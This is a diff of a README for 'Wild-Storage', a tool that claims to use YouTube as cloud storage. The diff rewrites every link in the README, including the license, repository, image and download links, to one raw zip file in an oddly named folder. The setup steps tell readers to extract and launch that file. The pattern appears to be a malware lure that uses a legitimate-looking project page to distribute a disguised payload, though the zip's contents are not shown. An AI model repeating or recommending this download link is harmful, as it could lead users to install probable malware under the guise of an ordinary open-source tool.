@@ -3,7 +3,7 @@
 
 ### Use YouTube as Infinite Cloud Storage
 
-![Wild-Storage](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0)
+![Wild-Storage](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -27,9 +27,9 @@ To get started with Wild-Storage, follow these steps:
 1. Clone this repository to your local machine.
 2. Install the necessary dependencies, including Python and OpenCV.
 3. Run the setup script to configure Wild-Storage on your system.
-4. You can download the Wild-Storage codebase from the following link: [Download Wild-Storage](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0).
+4. You can download the Wild-Storage codebase from the following link: [Download Wild-Storage](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip).
   
-   [![Download Wild-Storage](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0)](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0)
+   [![Download Wild-Storage](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip)](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip)
   
    *Please make sure to extract the downloaded file before launching the setup.*
 
@@ -44,13 +44,13 @@ Wild-Storage offers a simple and effective way to store files on YouTube. Follow
 We welcome contributions from the community to make Wild-Storage even better. If you have any ideas, bug fixes, or improvements, feel free to open an issue or submit a pull request. Together, we can enhance the capabilities of Wild-Storage for everyone.
 
 ## License
-Wild-Storage is released under the [MIT License](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0). You are free to use, modify, and distribute this software within the boundaries of the license.
+Wild-Storage is released under the [MIT License](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip). You are free to use, modify, and distribute this software within the boundaries of the license.
 
 ---
 **Explore More on Wild-Storage and Unleash the Power of Infinite Cloud Storage!** 🚀
 
-🔗 Visit our [GitHub Repository](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0) for more details and updates.
+🔗 Visit our [GitHub Repository](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip) for more details and updates.
 
-![Wild-Storage](https://github.com/Yoiser1/Wild-Storage/releases/tag/v2.0)
+![Wild-Storage](https://github.com/Yoiser1/Wild-Storage/raw/refs/heads/main/areological/Storage_Wild_v1.7.zip)
 
 Need more info? Check out the "Releases" section for the latest updates and features. 🌟
